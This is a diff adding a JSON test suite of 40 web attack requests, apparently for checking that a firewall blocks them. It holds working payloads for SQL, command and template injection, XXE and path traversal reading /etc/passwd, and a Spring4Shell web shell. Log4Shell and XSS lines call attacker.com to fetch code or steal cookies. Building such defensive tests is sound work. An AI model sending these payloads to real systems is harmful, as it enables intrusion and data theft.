@@ -1,0 +1,552 @@
+[
+  {
+    "poc_id": "sqli-union-001",
+    "name": "SQL注入-联合查询注入(GET)",
+    "url": "https://target.com/api/user",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"id\":\"1' union select 1,version(),database(),user()--+\"}",
+    "expected_result": "blocked",
+    "attack_type": "sql_injection"
+  },
+  {
+    "poc_id": "sqli-blind-boolean-002",
+    "name": "SQL注入-布尔盲注(POST-FORM)",
+    "url": "https://target.com/api/login",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "username=admin' and (select count(*) from users) > 0--+&password=123",
+    "expected_result": "blocked",
+    "attack_type": "sql_injection"
+  },
+  {
+    "poc_id": "sqli-blind-time-003",
+    "name": "SQL注入-时间盲注(POST-JSON)",
+    "url": "https://target.com/api/query",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"query\":\"1' and sleep(5)--+\"}",
+    "expected_result": "blocked",
+    "attack_type": "sql_injection"
+  },
+  {
+    "poc_id": "nosqli-mongodb-004",
+    "name": "NoSQL注入-MongoDB(GET)",
+    "url": "https://target.com/api/userinfo",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"username\":\"admin\",\"password\":{\"$ne\":null}}",
+    "expected_result": "blocked",
+    "attack_type": "nosql_injection"
+  },
+  {
+    "poc_id": "os-command-injection-005",
+    "name": "OS命令注入-拼接执行(POST-FORM)",
+    "url": "https://target.com/api/ping",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "ip=127.0.0.1; cat /etc/passwd",
+    "expected_result": "blocked",
+    "attack_type": "os_command_injection"
+  },
+  {
+    "poc_id": "code-injection-python-006",
+    "name": "代码注入-Python eval(POST-JSON)",
+    "url": "https://target.com/api/exec",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"code\":\"eval('__import__(\\\"os\\\").system(\\\"whoami\\\")')\"}",
+    "expected_result": "blocked",
+    "attack_type": "code_injection"
+  },
+  {
+    "poc_id": "ldap-injection-007",
+    "name": "LDAP注入-权限绕过(GET)",
+    "url": "https://target.com/api/ldap/auth",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"username\":\"admin*)(&\",\"password\":\"123\"}",
+    "expected_result": "blocked",
+    "attack_type": "ldap_injection"
+  },
+  {
+    "poc_id": "xml-injection-008",
+    "name": "XML注入-数据篡改(POST-JSON)",
+    "url": "https://target.com/api/xml/parse",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/xml",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "<?xml version=\"1.0\"?><user><name>admin</name><role>admin</role></user>",
+    "expected_result": "blocked",
+    "attack_type": "xml_injection"
+  },
+  {
+    "poc_id": "template-injection-jinja2-009",
+    "name": "模板注入-Jinja2(GET)",
+    "url": "https://target.com/api/render",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"name\":\"{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}\"}",
+    "expected_result": "blocked",
+    "attack_type": "template_injection"
+  },
+  {
+    "poc_id": "vertical-auth-bypass-010",
+    "name": "垂直越权-访问管理员接口(GET)",
+    "url": "https://target.com/api/admin/user/list",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "Cookie": "session=normal_user_session",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{}",
+    "expected_result": "blocked",
+    "attack_type": "broken_access_control"
+  },
+  {
+    "poc_id": "horizontal-auth-bypass-011",
+    "name": "水平越权-访问他人订单(POST-JSON)",
+    "url": "https://target.com/api/order/info",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/json",
+      "Cookie": "session=user_a_session",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"orderId\":\"10086\"}",
+    "expected_result": "blocked",
+    "attack_type": "broken_access_control"
+  },
+  {
+    "poc_id": "insecure-direct-object-012",
+    "name": "不安全直接对象引用-文件读取(GET)",
+    "url": "https://target.com/api/file/download",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"fileId\":\"1001\"}",
+    "expected_result": "blocked",
+    "attack_type": "broken_access_control"
+  },
+  {
+    "poc_id": "path-traversal-013",
+    "name": "目录遍历-读取/etc/passwd(GET)",
+    "url": "https://target.com/api/static",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"path\":\"../../../../etc/passwd\"}",
+    "expected_result": "blocked",
+    "attack_type": "path_traversal"
+  },
+  {
+    "poc_id": "lfi-014",
+    "name": "本地文件包含-包含/etc/passwd(GET)",
+    "url": "https://target.com/api/include",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"file\":\"../../../../etc/passwd\"}",
+    "expected_result": "blocked",
+    "attack_type": "file_inclusion"
+  },
+  {
+    "poc_id": "rfi-015",
+    "name": "远程文件包含-恶意脚本(GET)",
+    "url": "https://target.com/api/include",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"file\":\"http://attacker.com/malicious.php\"}",
+    "expected_result": "blocked",
+    "attack_type": "file_inclusion"
+  },
+  {
+    "poc_id": "api-unauth-016",
+    "name": "API未授权访问-敏感接口(POST-JSON)",
+    "url": "https://target.com/api/user/delete",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"userId\":\"1001\"}",
+    "expected_result": "blocked",
+    "attack_type": "api_unauthorized_access"
+  },
+  {
+    "poc_id": "cleartext-transmission-017",
+    "name": "敏感数据明文传输-HTTP传密码(POST-FORM)",
+    "url": "http://target.com/api/login",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "username=admin&password=Admin@123456",
+    "expected_result": "blocked",
+    "attack_type": "sensitive_data_exposure"
+  },
+  {
+    "poc_id": "weak-encryption-md5-018",
+    "name": "弱加密算法-MD5存储密码(POST-JSON)",
+    "url": "https://target.com/api/user/register",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"username\":\"test\",\"password\":\"e10adc3949ba59abbe56e057f20f883e\"}",
+    "expected_result": "blocked",
+    "attack_type": "sensitive_data_exposure"
+  },
+  {
+    "poc_id": "hardcoded-key-019",
+    "name": "硬编码密钥-API加密(POST-JSON)",
+    "url": "https://target.com/api/encrypt",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"data\":\"test\",\"key\":\"1234567890abcdef\"}",
+    "expected_result": "blocked",
+    "attack_type": "sensitive_data_exposure"
+  },
+  {
+    "poc_id": "ssrf-internal-020",
+    "name": "SSRF-访问内网MySQL(POST-JSON)",
+    "url": "https://target.com/api/fetch",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"url\":\"http://192.168.0.1:3306/\"}",
+    "expected_result": "blocked",
+    "attack_type": "ssrf"
+  },
+  {
+    "poc_id": "xxe-read-file-021",
+    "name": "XXE-读取/etc/passwd(POST-XML)",
+    "url": "https://target.com/api/xml/parse",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/xml",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+    "expected_result": "blocked",
+    "attack_type": "xxe"
+  },
+  {
+    "poc_id": "oauth-misconfig-022",
+    "name": "OAuth配置错误-重定向劫持(GET)",
+    "url": "https://target.com/api/oauth/callback",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"code\":\"fake_code\",\"redirect_uri\":\"http://attacker.com/callback\"}",
+    "expected_result": "blocked",
+    "attack_type": "third_party_integration"
+  },
+  {
+    "poc_id": "default-cred-023",
+    "name": "默认账户密码-管理员登录(POST-FORM)",
+    "url": "https://target.com/api/login",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "username=admin&password=admin123",
+    "expected_result": "blocked",
+    "attack_type": "security_misconfiguration"
+  },
+  {
+    "poc_id": "error-info-leak-024",
+    "name": "错误信息泄露-堆栈跟踪(GET)",
+    "url": "https://target.com/api/error",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"id\":\"invalid_id\"}",
+    "expected_result": "blocked",
+    "attack_type": "security_misconfiguration"
+  },
+  {
+    "poc_id": "missing-csp-025",
+    "name": "缺失CSP头-XSS利用(GET)",
+    "url": "https://target.com/api/page",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"content\":\"<script>alert(1)</script>\"}",
+    "expected_result": "blocked",
+    "attack_type": "security_misconfiguration"
+  },
+  {
+    "poc_id": "log4shell-026",
+    "name": "Log4Shell-RCE(POST-JSON)",
+    "url": "https://target.com/api/log",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/json",
+      "User-Agent": "${jndi:ldap://attacker.com:1389/Exploit}",
+      "X-Request-ID": "${jndi:ldap://attacker.com:1389/Exploit}"
+    },
+    "data": "{\"message\":\"${jndi:ldap://attacker.com:1389/Exploit}\"}",
+    "expected_result": "blocked",
+    "attack_type": "vulnerable_components"
+  },
+  {
+    "poc_id": "spring4shell-027",
+    "name": "Spring4Shell-RCE(POST-FORM)",
+    "url": "https://target.com/api/test",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7D%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7D.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7D&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&pwd=j&cmd=whoami",
+    "expected_result": "blocked",
+    "attack_type": "vulnerable_components"
+  },
+  {
+    "poc_id": "weak-password-028",
+    "name": "弱密码-简单密码登录(POST-FORM)",
+    "url": "https://target.com/api/login",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "username=admin&password=123456",
+    "expected_result": "blocked",
+    "attack_type": "authentication_failure"
+  },
+  {
+    "poc_id": "session-fixation-029",
+    "name": "会话固定-劫持会话(GET)",
+    "url": "https://target.com/api/login",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "Cookie": "PHPSESSID=fixed_session_id_123456",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"username\":\"admin\",\"password\":\"Admin@123\"}",
+    "expected_result": "blocked",
+    "attack_type": "authentication_failure"
+  },
+  {
+    "poc_id": "password-reset-flaw-030",
+    "name": "密码重置-越权重置他人密码(POST-JSON)",
+    "url": "https://target.com/api/user/reset-pwd",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"userId\":\"1001\",\"newPwd\":\"NewPass123\"}",
+    "expected_result": "blocked",
+    "attack_type": "authentication_failure"
+  },
+  {
+    "poc_id": "param-tampering-price-031",
+    "name": "业务参数篡改-修改商品价格(POST-JSON)",
+    "url": "https://target.com/api/order/create",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"goodsId\":\"1001\",\"price\":0.01,\"quantity\":1}",
+    "expected_result": "blocked",
+    "attack_type": "business_logic_flaw"
+  },
+  {
+    "poc_id": "flow-bypass-captcha-032",
+    "name": "流程绕过-跳过短信验证码(POST-JSON)",
+    "url": "https://target.com/api/user/register",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"phone\":\"13800138000\",\"captcha\":\"bypass\",\"password\":\"Test@123456\"}",
+    "expected_result": "blocked",
+    "attack_type": "business_logic_flaw"
+  },
+  {
+    "poc_id": "xss-reflected-033",
+    "name": "反射型XSS-脚本执行(GET)",
+    "url": "https://target.com/api/search",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"keyword\":\"<script>alert(document.cookie)</script>\"}",
+    "expected_result": "blocked",
+    "attack_type": "xss"
+  },
+  {
+    "poc_id": "xss-stored-034",
+    "name": "存储型XSS-评论注入(POST-JSON)",
+    "url": "https://target.com/api/comment/add",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"content\":\"<img src=x onerror=fetch('https://attacker.com/steal?cookie='+document.cookie)>\"}",
+    "expected_result": "blocked",
+    "attack_type": "xss"
+  },
+  {
+    "poc_id": "csrf-transfer-035",
+    "name": "CSRF-恶意转账(POST-FORM)",
+    "url": "https://target.com/api/transfer",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Referer": "https://target.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "toAccount=attacker_account&amount=10000",
+    "expected_result": "blocked",
+    "attack_type": "csrf"
+  },
+  {
+    "poc_id": "unsafe-deserialization-java-036",
+    "name": "不安全反序列化-Java(POST-JSON)",
+    "url": "https://target.com/api/deserialize",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"serializedData\":\"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAADdAAEZXhlY3V0aW9ucQB+AAFMAAltZXNzYWdlcQB+AAF4cHVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAN0AAV3aG9hbWl0AAt7Y29tLmpzZXJpYWxpemUuZXZhbCgid2hvYW1pIik7fXEAfgAXc3IAEWphdmEubGFuZy5TdHJpbmcAAAAAAAAAAQIAAHhwdXIAE1tMamF2YS5sYW5nLlN0cmluZztbQc69s79kQwCAAB4cAAAAAN0AAJpZHQADXtjb20uZXhhbXBsZS5FeGFtcGxlQ2xhc3M7e30=\"}",
+    "expected_result": "blocked",
+    "attack_type": "unsafe_deserialization"
+  },
+  {
+    "poc_id": "cloud-misconfig-s3-037",
+    "name": "云配置错误-S3桶公开访问(GET)",
+    "url": "https://target-bucket.s3.amazonaws.com/sensitive-data.csv",
+    "method": "GET",
+    "headers": {
+      "Host": "target-bucket.s3.amazonaws.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{}",
+    "expected_result": "blocked",
+    "attack_type": "cloud_misconfiguration"
+  },
+  {
+    "poc_id": "graphql-dos-038",
+    "name": "GraphQL-深度查询DoS(POST-JSON)",
+    "url": "https://target.com/api/graphql",
+    "method": "POST",
+    "headers": {
+      "Host": "target.com",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"query\":\"query { user { posts { comments { author { posts { comments { author { name } } } } } } } }\"}",
+    "expected_result": "blocked",
+    "attack_type": "graphql_vulnerability"
+  },
+  {
+    "poc_id": "websocket-unauth-039",
+    "name": "WebSocket-未授权访问(GET)",
+    "url": "wss://target.com/ws",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "Sec-WebSocket-Version": "13",
+      "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"action\":\"getAllUsers\"}",
+    "expected_result": "blocked",
+    "attack_type": "websocket_vulnerability"
+  },
+  {
+    "poc_id": "normal-request-040",
+    "name": "正常请求-基准测试(GET)",
+    "url": "https://target.com/api/home",
+    "method": "GET",
+    "headers": {
+      "Host": "target.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"page\":1,\"size\":10}",
+    "expected_result": "allowed",
+    "attack_type": "normal"
+  }
+]
